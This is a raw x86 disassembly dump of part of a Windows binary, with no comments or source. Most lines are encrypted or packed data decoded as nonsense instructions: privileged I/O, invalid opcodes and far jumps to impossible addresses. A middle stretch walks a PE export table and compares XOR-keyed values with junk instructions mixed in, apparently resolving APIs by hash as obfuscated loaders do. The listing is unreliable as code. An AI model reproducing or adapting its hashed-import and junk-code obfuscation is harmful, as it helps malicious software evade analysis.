  4047b3:	js     0x404816
  4047b5:	sub    edi,0x5a
  4047b8:	cdq    
  4047b9:	adc    ebp,DWORD PTR [ebp+0xa737750]
  4047bf:	push   0xee3d006b
  4047c4:	aad    0x64
  4047c6:	xchg   edi,eax
  4047c7:	xchg   esp,eax
  4047c8:	popa   
  4047c9:	add    BYTE PTR [eax-0x5612f2e],dl
  4047cf:	int    0xfe
  4047d1:	xchg   BYTE PTR [ecx+0x7bd24502],cl
  4047d7:	int3   
  4047d8:	pop    edi
  4047d9:	pop    DWORD PTR [esi-0x4c7eee27]
  4047df:	jmp    0xefe5:0x75f9cc5
  4047e6:	js     0x404848
  4047e8:	pop    esp
  4047e9:	push   edi
  4047ea:	scas   al,BYTE PTR es:[edi]
  4047eb:	cmp    DWORD PTR [esi+0x2a],esi
  4047ee:	jo     0x404847
  4047f0:	fcomp  st(5)
  4047f2:	or     DWORD PTR [esi],esi
  4047f4:	mov    esp,0xcb9fee86
  4047f9:	pop    ebp
  4047fa:	stc    
  4047fb:	les    ecx,FWORD PTR [eax]
  4047fd:	aaa    
  4047fe:	in     al,dx
  4047ff:	mov    edx,0x40005a9b
  404804:	and    edx,DWORD PTR [ebx]
  404806:	cmp    al,0x8c
  404808:	push   ebp
  404809:	hlt    
  40480a:	jne    0x40488a
  40480c:	fadd   st(5),st
  40480e:	inc    ebp
  40480f:	jmp    0x404868
  404811:	out    0x85,al
  404813:	setnp  BYTE PTR [ebp+0x7bc19e1]
  40481a:	mov    bl,0x6a
  40481c:	ficomp DWORD PTR es:[edx]
  40481f:	aas    
  404820:	scas   eax,DWORD PTR es:[edi]
  404821:	fnstsw WORD PTR [edi+ebx*1]
  404824:	jbe    0x404803
  404826:	mov    al,ds:0x4a8a9f8c
  40482b:	xchg   ebx,eax
  40482c:	test   al,0x25
  40482e:	sar    ebp,cl
  404830:	sub    eax,0x5536129d
  404835:	out    dx,eax
  404836:	call   0xee70:0xddfac6c0
  40483d:	sub    ecx,ebx
  40483f:	std    
  404840:	xchg   edx,eax
  404841:	sbb    DWORD PTR [ebx],esi
  404843:	mov    al,ds:0x7f70d78c
  404848:	xchg   ebx,eax
  404849:	adc    ah,al
  40484b:	pop    ebx
  40484c:	push   eax
  40484d:	out    0x3b,eax
  40484f:	repz sub DWORD PTR [edi-0x2345eef9],esp
  404856:	and    eax,0x93c3ec15
  40485b:	iret   
  40485c:	add    al,0x9e
  40485e:	nop
  40485f:	scas   al,BYTE PTR es:[edi]
  404860:	pop    ecx
  404861:	pushf  
  404862:	ret    0xba3d
  404865:	xor    eax,DWORD PTR [eax+0x74]
  404868:	ins    DWORD PTR es:[edi],dx
  404869:	sbb    BYTE PTR [esp+ebp*4+0x67],0x3a
  40486e:	mov    bh,cl
  404870:	lods   eax,DWORD PTR ds:[esi]
  404871:	mov    bl,0x1
  404873:	mov    ecx,0xf13c8580
  404878:	lock dec esp
  40487a:	push   es
  40487b:	imul   edi
  40487d:	outs   dx,DWORD PTR ds:[esi]
  40487e:	mov    al,ds:0xd5ddcbd0
  404883:	jl     0x404899
  404885:	jg     0x4048d0
  404887:	dec    esp
  404888:	je     0x40482a
  40488a:	push   ebx
  40488b:	xor    ebx,esi
  40488d:	test   al,0x8a
  40488f:	ss xor BYTE PTR cs:[esi+0x64],0xd4
  404895:	sub    DWORD PTR [ecx+0x77],ebx
  404898:	outs   dx,BYTE PTR ds:[esi]
  404899:	out    dx,eax
  40489a:	and    al,0xe9
  40489c:	xchg   DWORD PTR [eax-0x4e],ecx
  40489f:	mov    ebx,DWORD PTR ss:[ecx+0xe]
  4048a3:	push   edx
  4048a4:	inc    ebx
  4048a5:	jg     0x40483f
  4048a7:	out    dx,eax
  4048a8:	or     BYTE PTR [ecx-0x5f],dl
  4048ab:	xor    DWORD PTR [eax-0x40a5c07],edx
  4048b1:	or     BYTE PTR [ecx+0x18],al
  4048b4:	outs   dx,DWORD PTR ds:[esi]
  4048b5:	jnp    0x40492f
  4048b7:	hlt    
  4048b8:	retf   0x54a6
  4048bb:	jmp    0xd263:0x424d6ed1
  4048c2:	stos   BYTE PTR es:[edi],al
  4048c3:	jns    0x404919
  4048c5:	adc    ebx,DWORD PTR [ebx]
  4048c7:	dec    ebp
  4048c8:	dec    ebp
  4048c9:	mov    ds:0xd05d4750,al
  4048ce:	ja     0x4048d8
  4048d0:	jge    0x404941
  4048d2:	jno    0x404926
  4048d4:	xor    ecx,ecx
  4048d6:	lea    edi,[esi-0x1a]
  4048d9:	and    BYTE PTR [edi-0x1],0x8f
  4048dd:	test   eax,0x7d224cb8
  4048e2:	add    al,0x77
  4048e4:	mov    BYTE PTR [ebp-0x11563f1],ah
  4048ea:	inc    ebp
  4048eb:	add    al,0x76
  4048ed:	push   ebx
  4048ee:	mov    al,0x18
  4048f0:	loopne 0x404943
  4048f2:	dec    ebp
  4048f3:	jbe    0x4048ed
  4048f5:	lds    ebp,FWORD PTR ds:0x854b97ce
  4048fb:	xchg   esi,eax
  4048fc:	xchg   ecx,eax
  4048fd:	rcr    BYTE PTR [edx],1
  4048ff:	sbb    DWORD PTR [ecx+edi*8-0x1b204faf],ebp
  404906:	gs (bad) 
  404908:	cli    
  404909:	or     ch,BYTE PTR [ebx]
  40490b:	shr    BYTE PTR [ecx+ebx*2+0x36f70640],cl
  404912:	call   0x8edd5693
  404917:	div    BYTE PTR [esi+0x16]
  40491a:	inc    esi
  40491b:	add    eax,edi
  40491d:	adc    BYTE PTR [ecx-0x5f1b7c9f],ch
  404923:	xlat   BYTE PTR ds:[ebx]
  404924:	(bad)  
  404926:	shr    DWORD PTR [ebx-0x22b8a2e4],0xae
  40492d:	push   cs
  40492e:	add    eax,0x1c8cfe1e
  404933:	leave  
  404934:	push   edi
  404935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404936:	mov    ch,0xd4
  404938:	ret    
  404939:	imul   ebx,DWORD PTR [ebx],0x50a20783
  40493f:	inc    ebx
  404940:	xchg   ecx,eax
  404941:	jg     0x404998
  404943:	or     eax,0x53db488b
  404948:	(bad)  ds:0x2cf251f
  40494e:	int    0xe0
  404950:	xchg   edx,eax
  404951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404952:	je     0x4048f0
  404954:	and    al,0x82
  404956:	or     ecx,DWORD PTR [esi+0x4c1a692a]
  40495c:	aad    0xab
  40495e:	or     eax,0xec4d7b8c
  404963:	dec    esp
  404964:	lods   eax,DWORD PTR ds:[esi]
  404965:	pop    es
  404966:	pop    edx
  404967:	sahf   
  404968:	mov    bh,0x87
  40496a:	mov    eax,DWORD PTR [edx]
  40496c:	fcom   QWORD PTR [ecx-0x2]
  40496f:	data16 mov al,0xc7
  404972:	addr16 sbb al,0x87
  404975:	mov    cl,0xf4
  404977:	pop    ecx
  404978:	scas   eax,DWORD PTR es:[edi]
  404979:	sahf   
  40497a:	imul   ebx,DWORD PTR [ebx+0x36],0x67b99926
  404981:	mov    gs,WORD PTR [esp+eax*1+0x1d]
  404985:	icebp  
  404986:	push   ebp
  404987:	repnz lods eax,DWORD PTR ds:[esi]
  404989:	ficomp WORD PTR [edi-0x52]
  40498c:	int3   
  40498d:	jmp    0x4049ba
  40498f:	lahf   
  404990:	sub    edx,DWORD PTR [ebp+0x3]
  404993:	cld    
  404994:	lock and dl,dl
  404997:	arpl   WORD PTR [eax+0x4b],bx
  40499a:	out    0x73,eax
  40499c:	or     al,0xf0
  40499e:	(bad)  
  40499f:	xchg   edi,eax
  4049a0:	ret    
  4049a1:	cli    
  4049a2:	imul   esi,DWORD PTR [esi-0x25],0xffffff90
  4049a6:	cmp    ah,BYTE PTR [ebp+0x167cf307]
  4049ac:	xchg   esi,eax
  4049ad:	ss jl  0x4049d2
  4049b0:	lods   eax,DWORD PTR ds:[esi]
  4049b1:	imul   BYTE PTR [ecx+eiz*8]
  4049b4:	sub    DWORD PTR [esi],esi
  4049b6:	repz mov ecx,DWORD PTR [ecx]
  4049b9:	inc    ecx
  4049ba:	sbb    al,0x66
  4049bc:	jmp    0xfa76:0x1aa1927f
  4049c3:	mov    BYTE PTR [esi+0x67],cl
  4049c6:	and    eax,DWORD PTR [ecx]
  4049c8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4049ca:	mov    edi,DWORD PTR [esi+0x75]
  4049cd:	aas    
  4049ce:	scas   al,BYTE PTR es:[edi]
  4049cf:	retf   0x65a
  4049d2:	push   cs
  4049d3:	arpl   sp,cx
  4049d5:	mov    ch,0x30
  4049d7:	adc    al,0x50
  4049d9:	xchg   esi,eax
  4049da:	hlt    
  4049db:	jo     0x404974
  4049dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049de:	enter  0x34da,0x70
  4049e2:	imul   esp,DWORD PTR [eax+ecx*8],0x55
  4049e6:	out    0x65,al
  4049e8:	mov    edx,0xad8950cb
  4049ed:	dec    ebp
  4049ee:	sbb    al,0x44
  4049f0:	mov    edi,DWORD PTR [ebx+0xd1f71d]
  4049f6:	hlt    
  4049f7:	sti    
  4049f8:	test   BYTE PTR [edx-0xead63be],bh
  4049fe:	jmp    0x4eff3771
  404a03:	add    BYTE PTR [edx-0x6da5b963],ch
  404a09:	scas   al,BYTE PTR es:[edi]
  404a0a:	and    eax,0x4d8d8afd
  404a0f:	inc    eax
  404a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a11:	pop    eax
  404a12:	push   edx
  404a13:	fmul   DWORD PTR [edx-0x4d4b14ff]
  404a19:	adc    al,0xe4
  404a1b:	mov    ebx,0xd94b2e93
  404a20:	or     eax,edi
  404a22:	add    edx,esi
  404a24:	mov    esi,0x8bea5ceb
  404a29:	jbe    0x404a7a
  404a2b:	iret   
  404a2c:	mov    eax,DWORD PTR [ebp+0xf]
  404a2f:	in     eax,0x9d
  404a31:	cli    
  404a32:	pmaddwd mm1,QWORD PTR [ebx-0x64854740]
  404a39:	adc    esp,DWORD PTR [ebx+0x2]
  404a3c:	pop    eax
  404a3d:	retf   
  404a3e:	into   
  404a3f:	inc    eax
  404a40:	inc    ecx
  404a41:	cwde   
  404a42:	push   ss
  404a43:	mov    ebx,0x522d5cc
  404a48:	outs   dx,DWORD PTR ds:[esi]
  404a49:	hlt    
  404a4a:	idiv   edx
  404a4c:	or     dh,BYTE PTR [edx+0x24fc320a]
  404a52:	mov    cl,0xcc
  404a54:	dec    edi
  404a55:	dec    esp
  404a56:	in     al,0xdb
  404a58:	not    bl
  404a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a5b:	fisttp WORD PTR [ebp+0x44a4bd44]
  404a61:	stos   DWORD PTR es:[edi],eax
  404a62:	or     BYTE PTR [ebp-0x3f],0x81
  404a66:	dec    eax
  404a67:	(bad)  
  404a68:	or     BYTE PTR [eax+eiz*4],ch
  404a6b:	pop    es
  404a6c:	xor    bl,BYTE PTR [ecx]
  404a6e:	jnp    0x404ad4
  404a70:	stos   DWORD PTR es:[edi],eax
  404a71:	xchg   edi,eax
  404a72:	sub    ecx,ebp
  404a74:	mov    ch,0xc8
  404a76:	mov    dl,0x6c
  404a78:	call   0xbbc423c6
  404a7d:	or     DWORD PTR [ebp+ecx*1-0x78],ebx
  404a81:	(bad)  
  404a82:	jg     0x404aff
  404a84:	mov    eax,ds:0xfa6e3b9
  404a89:	adc    al,0xda
  404a8b:	xchg   ecx,eax
  404a8c:	and    eax,0x7df838b0
  404a91:	stos   BYTE PTR es:[edi],al
  404a92:	out    0x1,al
  404a94:	je     0x404b01
  404a96:	or     al,0x1d
  404a98:	push   ebp
  404a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a9a:	call   0xd2d3:0x489f78ac
  404aa1:	dec    esi
  404aa2:	and    eax,0xf13a35d8
  404aa7:	push   edx
  404aa8:	test   eax,0x4efd8bde
  404aad:	es popf 
  404aaf:	les    edi,FWORD PTR [ebx-0x20]
  404ab2:	les    ebx,FWORD PTR ds:0x722f4059
  404ab8:	jp     0x404aee
  404aba:	mov    esi,edi
  404abc:	aas    
  404abd:	push   cs
  404abe:	and    eax,0x2f097f26
  404ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ac4:	rol    BYTE PTR [esi-0x22],1
  404ac7:	std    
  404ac8:	test   esp,esp
  404aca:	int    0xb1
  404acc:	and    al,0xf2
  404ace:	int    0x4d
  404ad0:	jle    0x404ae0
  404ad2:	rol    DWORD PTR [edx],0x64
  404ad5:	xor    BYTE PTR [edi-0x677e8cd2],0x40
  404adc:	loope  0x404a87
  404ade:	fwait
  404adf:	pop    edx
  404ae0:	pop    es
  404ae1:	imul   edx,DWORD PTR [edi],0x6717dd0d
  404ae7:	aaa    
  404ae8:	outs   dx,BYTE PTR ds:[esi]
  404ae9:	jp     0x404b11
  404aeb:	push   ecx
  404aec:	(bad)  
  404aed:	fbld   TBYTE PTR [edi+0x0]
  404af0:	and    al,0xa1
  404af2:	mov    al,bl
  404af4:	or     al,0x20
  404af6:	repz pushf 
  404af8:	stos   BYTE PTR es:[edi],al
  404af9:	mov    WORD PTR [edx+edx*2],es
  404afc:	jp     0x404aa9
  404afe:	xor    DWORD PTR [eax-0x3eb6c02],edi
  404b04:	or     al,0x36
  404b06:	ja     0x404aab
  404b08:	xchg   ebp,eax
  404b09:	xchg   edx,eax
  404b0a:	pop    ecx
  404b0b:	ror    cl,0xb
  404b0e:	fs pusha 
  404b10:	retf   0xc395
  404b13:	test   al,0x45
  404b15:	imul   ebp,DWORD PTR [ecx+0x39],0xe0eb75a2
  404b1c:	mov    eax,0xbe953948
  404b21:	mov    esp,eax
  404b23:	mov    ds:0x9f3fc6f6,ax
  404b29:	pop    esi
  404b2a:	adc    DWORD PTR [edi],esi
  404b2c:	out    dx,eax
  404b2d:	imul   edx,DWORD PTR ds:[ecx-0x2f1f0e3f],0xd94b97a3
  404b38:	push   esi
  404b39:	mov    eax,ds:0x64455394
  404b3e:	ins    BYTE PTR es:[edi],dx
  404b3f:	not    DWORD PTR [ecx-0x38f900b9]
  404b45:	inc    eax
  404b46:	jb     0x404ad3
  404b48:	rol    DWORD PTR [edx-0x13583bf8],0x18
  404b4f:	call   0xcbc5:0xed265f65
  404b56:	mov    eax,ds:0xdf3beb02
  404b5b:	inc    edi
  404b5c:	(bad)  
  404b5d:	push   ecx
  404b5e:	xchg   esp,eax
  404b5f:	mov    ah,0xbb
  404b61:	cs aad 0xae
  404b64:	jmp    0x404ba7
  404b66:	jge    0x404b1e
  404b68:	in     al,0x91
  404b6a:	outs   dx,BYTE PTR ds:[esi]
  404b6b:	jae    0x404bdb
  404b6d:	popf   
  404b6e:	xor    bh,cl
  404b70:	dec    di
  404b72:	xchg   edx,eax
  404b73:	dec    esp
  404b74:	lods   eax,DWORD PTR ds:[esi]
  404b75:	sub    al,0xc
  404b77:	jle    0x404b31
  404b79:	jae    0x404b0e
  404b7b:	fwait
  404b7c:	jnp    0x404bba
  404b7e:	out    0xf7,al
  404b80:	xchg   esi,eax
  404b81:	adc    DWORD PTR [edx],ebp
  404b83:	jae    0x404b1b
  404b85:	jmp    0x404bc3
  404b87:	xchg   edi,eax
  404b88:	adc    DWORD PTR [edx+0xe2aa468],ebx
  404b8e:	mov    bh,ch
  404b90:	sub    BYTE PTR ds:0x3b71f7be,bh
  404b96:	sbb    al,0xad
  404b98:	jg     0x404b44
  404b9a:	adc    BYTE PTR [edi+0x12a89c19],bl
  404ba0:	xor    eax,0xe57c1a09
  404ba5:	popa   
  404ba6:	jl     0x404b3e
  404ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ba9:	pop    ss
  404baa:	jle    0x404be9
  404bac:	xchg   esp,eax
  404bad:	cdq    
  404bae:	dec    ebp
  404baf:	fs xchg esi,eax
  404bb1:	xchg   edi,eax
  404bb2:	lds    ecx,FWORD PTR [ebp+edx*2+0x67]
  404bb6:	gs xchg ecx,eax
  404bb8:	add    al,0xa1
  404bbb:	xchg   bx,ax
  404bbd:	dec    edi
  404bbe:	pop    ebp
  404bbf:	lods   al,BYTE PTR ds:[esi]
  404bc0:	cmp    BYTE PTR [ebx],dh
  404bc2:	xor    DWORD PTR [eax],0xf5184ef6
  404bc8:	lds    edx,FWORD PTR [ebx-0x53779096]
  404bce:	lods   eax,DWORD PTR ds:[esi]
  404bcf:	cli    
  404bd0:	mov    esi,0xcaf9b8ee
  404bd5:	cmp    cl,BYTE PTR [esi+0x16]
  404bd8:	jg     0x404bf8
  404bda:	or     ah,dh
  404bdc:	in     al,dx
  404bdd:	xor    eax,0xc133beab
  404be2:	and    al,0x91
  404be4:	mov    cs,WORD PTR [ebx-0x7e]
  404be7:	sahf   
  404be8:	mov    ah,0xd6
  404bea:	fdiv   QWORD PTR [ecx]
  404bec:	or     eax,0x15d63d8b
  404bf1:	ds push eax
  404bf3:	cmp    esp,esp
  404bf5:	push   es
  404bf6:	mov    ebp,0x7bb827aa
  404bfb:	xor    esi,edi
  404bfd:	je     0x404bcd
  404bff:	jle    0x404c4d
  404c01:	les    ebp,FWORD PTR [ebp-0x3adc72eb]
  404c07:	cmp    BYTE PTR [edi+esi*4+0x8],cl
  404c0b:	or     DWORD PTR [ebx-0x30c8a204],esi
  404c11:	in     al,dx
  404c12:	sub    eax,0x1a50a4dc
  404c17:	cmp    bl,dh
  404c19:	cmc    
  404c1a:	mov    edi,0x6b4c5b03
  404c1f:	jmp    0x9f0f:0x3cbe538f
  404c26:	lods   eax,DWORD PTR ds:[esi]
  404c27:	push   esi
  404c28:	loopne 0x404bed
  404c2a:	sbb    al,0xe
  404c2c:	ds icebp 
  404c2e:	jmp    0x236739ea
  404c33:	rcr    BYTE PTR [ebx+0x1808702d],1
  404c39:	add    esi,DWORD PTR [ebp-0xa093eca]
  404c3f:	retf   0x9002
  404c42:	adc    eax,0x87aef149
  404c47:	add    al,0x9c
  404c49:	jl     0x404bd5
  404c4b:	scas   eax,DWORD PTR es:[edi]
  404c4c:	call   0xdf18da3
  404c51:	repnz add DWORD PTR [edx-0x6a],ebp
  404c55:	inc    eax
  404c56:	mov    eax,DWORD PTR [ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	ds xor eax,0x5f0aa069
  404e9c:	jp     0x404f18
  404e9e:	or     bl,BYTE PTR [edi+0x7a]
  404ea1:	jp     0x404e89
  404ea3:	inc    eax
  404ea4:	inc    eax
  404ea5:	push   edx
  404ea6:	lock inc esi
  404ea8:	fdiv   DWORD PTR [eax-0x2a]
  404eab:	rol    BYTE PTR [edi+0x5a],1
  404eae:	pop    ebx
  404eaf:	stos   BYTE PTR es:[edi],al
  404eb0:	add    BYTE PTR [ecx-0xeaa5e68],dl
  404eb6:	or     DWORD PTR [ecx+edi*1-0x3a],0x95b829c3
  404ebe:	inc    eax
  404ebf:	fisubr DWORD PTR [edx-0x4ab5e7f4]
  404ec5:	push   edi
  404ec6:	sub    al,0x6e
  404ec8:	into   
  404ec9:	add    al,cl
  404ecb:	mov    eax,DWORD PTR [edx+0x31]
  404ece:	mov    edi,0x16148424
  404ed3:	jecxz  0x404e78
  404ed5:	sbb    eax,DWORD PTR [edi+0x5390af]
  404edb:	adc    BYTE PTR [ecx],bh
  404edd:	mov    al,ds:0x145d79f3
  404ee2:	cmp    cl,cl
  404ee4:	fmul   DWORD PTR [esi-0x67]
  404ee7:	or     edx,DWORD PTR [ebp+0x7edff4c8]
  404eed:	jo     0x404f00
  404eef:	fmul   st(0),st
  404ef1:	jo     0x404ed2
  404ef3:	fimul  WORD PTR [esi-0x403c5610]
  404ef9:	or     DWORD PTR [eax],edi
  404efb:	inc    ecx
  404efc:	mov    ebx,0x43fc15ce
  404f01:	fst    QWORD PTR ds:0xf4f5a8b6
  404f07:	or     edi,DWORD PTR [eax-0x49]
  404f0a:	add    ebp,eax
  404f0c:	(bad)  
  404f0d:	dec    eax
  404f0e:	fstp   TBYTE PTR [ecx-0x1f1e0dbe]
  404f14:	mov    dl,0xd7
  404f16:	and    ebp,DWORD PTR [edi-0x51]
  404f19:	aaa    
  404f1a:	jmp    0xf59d:0xeed2a7bd
  404f21:	inc    eax
  404f22:	lahf   
  404f23:	repz add ebx,ebp
  404f26:	pusha  
  404f27:	cwde   
  404f28:	ror    DWORD PTR [esi+0x106eae8e],0x4a
  404f2f:	loop   0x404ed7
  404f31:	imul   ebx,DWORD PTR ds:0xe05d54cf,0xd86bf8d1
  404f3b:	sub    ebp,eax
  404f3d:	push   0x7d
  404f3f:	dec    edi
  404f40:	push   ss
  404f41:	pop    ebx
  404f42:	inc    ecx
  404f43:	or     DWORD PTR [eax+ebp*2+0x52aa7ff6],ebp
  404f4a:	pop    ecx
  404f4b:	xor    dl,BYTE PTR [ecx]
  404f4d:	xchg   BYTE PTR [ebx+0x5152d94f],ah
  404f53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f54:	lods   eax,DWORD PTR ds:[esi]
  404f55:	push   edi
  404f56:	sbb    DWORD PTR [edi-0x32],eax
  404f59:	iret   
  404f5a:	sub    BYTE PTR [ebx+0x6],cl
  404f5d:	mov    dh,0x7f
  404f5f:	lds    esi,FWORD PTR [eax]
  404f61:	dec    eax
  404f62:	ss pop esp
  404f64:	xlat   BYTE PTR ds:[ebx]
  404f65:	imul   eax,DWORD PTR [esi-0x5d],0x2c
  404f69:	jle    0x404ef2
  404f6b:	sbb    eax,0x74fc967d
  404f70:	jne    0x404f80
  404f72:	xchg   ebp,eax
  404f73:	dec    ebx
  404f74:	jecxz  0x404fbe
  404f76:	aam    0xd1
  404f78:	jne    0x404fe4
  404f7a:	je     0x404f2c
  404f7c:	pop    ss
  404f7d:	enter  0x8924,0xad
  404f81:	jmp    0x8a6e3fd4
  404f86:	loope  0x404fed
  404f88:	popf   
  404f89:	std    
  404f8a:	rcl    DWORD PTR [ebp-0x156566d6],cl
  404f90:	repnz fist WORD PTR [ecx+0x61cddbb]
  404f97:	sub    ebx,ecx
  404f99:	inc    eax
  404f9a:	cs loopne 0x404fab
  404f9d:	mov    bh,0xd0
  404f9f:	es push edi
  404fa1:	xor    ch,ah
  404fa3:	sbb    esi,ebx
  404fa5:	in     eax,0x68
  404fa7:	loopne 0x405024
  404fa9:	in     al,dx
  404faa:	sti    
  404fab:	ret    0x3cfb
  404fae:	mov    edi,0xac54226e
  404fb3:	jmp    0x4a15a1fc
  404fb8:	(bad)  
  404fb9:	fwait
  404fba:	jmp    FWORD PTR [eax]
  404fbc:	xor    BYTE PTR [eax+0x39],bl
  404fbf:	repnz cmovl esi,esp
  404fc3:	and    eax,0x7460722
  404fc8:	rol    BYTE PTR [ecx-0x366d20c3],1
  404fce:	cmp    eax,0x46622083
  404fd3:	dec    ebp
  404fd4:	mov    esi,0x4a85f87c
  404fd9:	mov    esi,0x27f6f03e
  404fde:	aad    0xfe
  404fe0:	outs   dx,DWORD PTR ds:[esi]
  404fe1:	pop    ss
  404fe2:	xor    eax,0x14018b5d
  404fe7:	clc    
